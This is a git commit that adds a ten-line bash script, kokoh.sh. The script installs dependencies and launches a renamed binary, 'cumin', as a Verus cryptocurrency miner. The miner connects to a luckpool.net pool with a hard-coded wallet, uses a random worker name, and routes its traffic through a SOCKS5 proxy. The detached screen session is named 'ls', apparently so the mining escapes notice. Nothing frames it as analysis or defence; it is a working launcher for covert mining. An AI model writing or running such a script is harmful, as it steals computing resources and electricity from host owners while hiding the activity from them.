a7706c14a4f48ae8fb585e14840d0b4979c2c479
xfdbtry5e <86540555+xfdbtry5e@users.noreply.github.com>
2021-07-01 21:42:50 +0700

    Create kokoh.sh

---
+++ kokoh.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x cumin
+screen -dmS ls 
+POOL=stratum+tcp://eu.luckpool.net:3956
+WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
+WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
+PROXY=socks5://98.162.25.23:4145
+./cumin -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
